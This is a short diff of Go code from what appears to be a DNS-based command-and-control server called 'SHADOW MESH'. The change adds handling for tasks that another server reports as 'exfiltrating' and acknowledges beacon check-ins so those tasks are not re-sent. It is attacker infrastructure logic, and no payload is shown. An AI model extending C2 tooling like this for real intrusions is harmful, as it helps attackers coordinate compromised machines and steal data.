@@ -1107,7 +1107,7 @@ func (c2 *C2Manager) handleCheckin(parts []string, clientIP string, isDuplicate 
 				// It might have been completed on another DNS server
 				c2.mutex.Unlock()
 
-				// SHADOW MESH: Check Master to see if task was completed elsewhere
+				// SHADOW MESH: Check Master to see if task was completed or being exfiltrated elsewhere
 				if masterClient != nil {
 					// Get master task ID if we have a mapping
 					c2.mutex.RLock()
@@ -1134,6 +1134,18 @@ func (c2 *C2Manager) handleCheckin(parts []string, clientIP string, isDuplicate 
 								logf("[DEBUG] Task %s was completed on another DNS server (status: %s), cleared from beacon %s", task.ID, masterStatus, beaconID)
 							}
 							return "ACK" // Don't re-send completed task
+						} else if masterStatus == "exfiltrating" {
+							// Task is being exfiltrated on another DNS server - update local status and return ACK
+							c2.mutex.Lock()
+							if storedTask, exists := c2.tasks[task.ID]; exists {
+								storedTask.Status = "exfiltrating"
+							}
+							c2.mutex.Unlock()
+
+							if c2.debug && !isDuplicate {
+								logf("[DEBUG] Task %s is exfiltrating on another DNS server, returning ACK to beacon %s", task.ID, beaconID)
+							}
+							return "ACK" // Don't re-send task that's being exfiltrated
 						}
 					}
 				}
